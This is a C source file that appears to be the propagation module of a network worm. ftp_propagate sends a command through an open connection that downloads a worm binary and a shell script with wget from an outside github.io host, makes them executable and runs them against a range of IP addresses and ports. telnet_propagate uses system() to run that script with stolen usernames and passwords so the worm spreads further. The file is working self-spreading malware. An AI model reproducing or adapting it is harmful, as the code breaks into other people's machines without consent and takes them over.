#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include "propagation.h"
#include "brutexor.h"

int ftp_propagate(int ftp_fd, char *firstIP, int minIP, int maxIP, int min_port, int max_port) {
	int size;
	char buffer[512];
	char *wormlink = "jrszlachta.github.io/worm/worm";
	char *scriptlink = "jrszlachta.github.io/worm/script.sh";

	size = snprintf(buffer, sizeof(buffer), "( ls | grep worm ) || ( wget %s && wget %s && chmod +x worm script.sh && "
	   	"./worm %s.%d-%d %d-%d )", wormlink, scriptlink, firstIP, minIP, maxIP, min_port, max_port);

	write(ftp_fd, buffer, size);

	return 1;
}

int telnet_propagate(login l, char *IP, char *firstIP, int minIP, int maxIP, int min_port, int max_port) {
	char buffer[512];

	snprintf(buffer, sizeof(buffer), "./script.sh %s %s %s %s %d %d %d %d", IP, l->user, l->passwd, firstIP, minIP, maxIP, min_port, max_port);

	system(buffer);

	return 1;
}
